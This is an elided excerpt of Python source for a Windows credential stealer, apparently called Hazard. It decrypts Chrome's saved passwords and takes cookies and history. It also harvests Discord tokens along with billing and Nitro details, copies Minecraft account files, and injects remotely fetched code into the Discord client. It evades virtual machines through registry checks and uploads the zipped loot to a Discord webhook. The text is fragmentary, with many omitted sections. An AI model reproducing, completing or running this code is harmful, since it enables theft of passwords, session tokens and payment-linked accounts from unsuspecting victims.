from os import getlogin,getenv,sep,makedirs,listdir,PathLike,startfile,remove,walk,system,name as _name,_exit;from psutil import virtual_memory,disk_usage,process_iter,cpu_count,NoSuchProcess,AccessDenied;from httpx import get,post,ConnectTimeout,TimeoutException,NetworkError;from winreg import OpenKey, HKEY_LOCAL_MACHINE,QueryValueEx,CloseKey;from re import findall,match,IGNORECASE,MULTILINE;from datetime import datetime,timedelta,timezone;from ntpath import exists,join,isdir,abspath;from win32crypt import CryptUnprotectData;from json import loads,load,decoder,dump;from zipfile import ZipFile,ZIP_DEFLATED;from tempfile import gettempdir,mkdtemp;from random import SystemRandom,randint;from threading import Thread,enumerate;from subprocess import check_output;from shutil import rmtree,copy2;from Crypto.Cipher import AES;from base64 import b64decode;from sqlite3 import connect;from PIL import ImageGrab;from ctypes import windll;from asyncio import run;from sys import argv
...
class Functions(object):
    @staticmethod
    def get_master_key(path: str or PathLike):
        if not exists(path):
            return None
    ...
    @staticmethod
    def create_temp_file(_dir: str or PathLike = gettempdir()):
        file_name = ''.join(SystemRandom().choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(randint(10, 20)))
        path = join(_dir, file_name)
        open(path, "x")
        return path
    ...
    def system_info() -> list:
        ...
        try:
            HWID = check_output(sh1, creationflags=flag).decode().split('\n')[1].strip()
        except Exception:
            HWID = "N/A"
        try:
            wkey = check_output(sh2, creationflags=flag).decode().rstrip()
        except Exception:
            wkey = "N/A"
        try:
            winver = check_output(sh3, creationflags=flag).decode().rstrip()
        except Exception:winver = "N/A"
        return [HWID, winver, wkey]

    @staticmethod
    def network_info() -> list:
        ip, city, country, region, org, loc, googlemap = "None", "None", "None", "None", "None", "None", "None"
        req = get("https://ipinfo.io/json")
...
class Hazard(Functions):
    def __init__(self):
        ...
        self.chrome_user_data = join(self.appdata, 'Google', 'Chrome', 'User Data')
        ...
        self.startup_loc = join(self.roaming, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')

        self.hook_reg = "api/webhooks"
        self.chrome_reg = compile(r'(^profile\s\d*)|default|(guest profile$)', IGNORECASE | MULTILINE)
        ...
        self.tokens = []
        self.robloxcookies = []
        self.chrome_key = self.get_master_key(join(self.chrome_user_data, "Local State"))
    ...
    async def checkToken(self, tkn: str) -> str:
        ...
        except (ConnectTimeout, TimeoutException):
            pass
    ...
    async def init(self):
        ...
        if exists(self.chrome_user_data) and self.chrome_key is not None:
            makedirs(join(self.dir, 'Google'), exist_ok=True)
    ...
    async def injector(self):
        ...
        for _dir in listdir(self.appdata):
            if 'discord' in _dir.lower() and isdir(_dir):
                discord = self.appdata + sep + _dir
                for __dir in listdir(abspath(discord)):
                    if match(r'app-(\d*\.\d*)*', __dir):
                        app = abspath(join(discord, __dir))
                        modules = join(app, 'modules')
                        if not exists(modules):
                            return
                        for ___dir in listdir(modules):
                            if match(r"discord_desktop_core-\d+", ___dir):
                                inj_path = modules + sep + ___dir + f'\\discord_desktop_core\\'
                                if exists(inj_path):
                                    if self.startup_loc not in argv[0]:
                                        try:
                                            makedirs(inj_path + 'initiation', exist_ok=True)
                                        except PermissionError:
                                            pass
                                    if self.hook_reg in self.webhook:
                                        f = get(self.fetch_conf('injection_url')).text.replace("%WEBHOOK%", self.webhook)
                                    else:
                                        f = get(
                                    ...
                                    try:
                                        ...
                                        pass
                                    if self.fetch_conf('kill_processes'):
                                        startfile(app + self.sep + _dir + '.exe')
    ...
    def grab_tokens(self):
        ...
        for name, path in paths.items():
            ...
            if "cord" in path:
                if exists(self.roaming + f'\\{disc}\\Local State'):
        ...
        if exists(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
    ...
    def grabPassword(self):
        f = open(join(self.dir, 'Google', 'Google Passwords.txt'), 'w', encoding="cp437", errors='ignore')
        for prof in listdir(self.chrome_user_data):
            if match(self.chrome_reg, prof):
                login_db = join(self.chrome_user_data, prof, 'Login Data')
    ...
    def grabCookies(self):
        f = open(join(self.dir, 'Google', 'Google Cookies.txt'), 'w', encoding="cp437", errors='ignore')
        for prof in listdir(self.chrome_user_data):
            if match(self.chrome_reg, prof):
                login_db = join(self.chrome_user_data, prof, 'Network', 'cookies')
                login = self.create_temp_file()
    ...
    def grabHistory(self):
        f = open(join(self.dir, 'Google', 'Google History.txt'), 'w', encoding="cp437", errors='ignore')
        ...
        for prof in listdir(self.chrome_user_data):
            if match(self.chrome_reg, prof):
                login_db = join(self.chrome_user_data, prof, 'History')
                login = self.create_temp_file()
    ...
    def neatifyTokens(self):
        ...
        for token in self.tokens:
            j = get(self.discordApi, headers=self.get_headers(token)).json()
            ...
            nitro_data = get(self.discordApi + '/billing/subscriptions', headers=self.get_headers(token)).json()
            has_nitro = False
            has_nitro = bool(len(nitro_data) > 0)
            billing = bool(len(loads(get(self.discordApi + "/billing/payment-sources", headers=self.get_headers(token)).text)) > 0)
            f.write(f"{' '*17}{user}\n{'-'*50}\nToken: {token}\nHas Billing: {billing}\nNitro: {has_nitro}\nBadges: {badges}\nEmail: {email}\nPhone: {phone}\n\n")
        f.close()

    def grabMinecraftCache(self):
        minecraft = join(self.dir, 'Minecraft')
        makedirs(minecraft, exist_ok=True)
        mc = join(self.roaming, '.minecraft')
        to_grab = ['launcher_accounts.json', 'launcher_profiles.json', 'usercache.json', 'launcher_log.txt']

        for _file in to_grab:
            if exists(join(mc, _file)):
                copy2(join(mc, _file), minecraft + self.sep + _file)
...
{line_sep}
    ...
    def finish(self):
        ...
        _zipfile = join(self.appdata, f'vbjcvxk.zip')
        zipped_file = ZipFile(_zipfile, "w", ZIP_DEFLATED)
        abs_src = abspath(self.dir)
        for dirname, _, files in walk(self.dir):
        ...
        for _, __, files in walk(self.dir):
            for _file in files:
                files_found += f"・{_file}\n"
                file_count += 1
        ...
        if self.fetch_conf('ping_on_run'):
            embed.update({'content': '@here'})

        with open(_zipfile, 'rb') as f:
            if self.hook_reg in self.webhook:
                post(self.webhook, json=embed)
                post(self.webhook, files={'upload_file': f})
            else:
                remove(_zipfile)
                self.hazard_exit()
...
class AntiDebug(Functions):
    ...
    def registryCheck(self):
        reg1 = system("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2> nul")
        reg2 = system("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2> nul")
        if (reg1 and reg2) != 1:
            self.programExit()
...
if __name__ == "__main__" and _name == "nt":
    try:
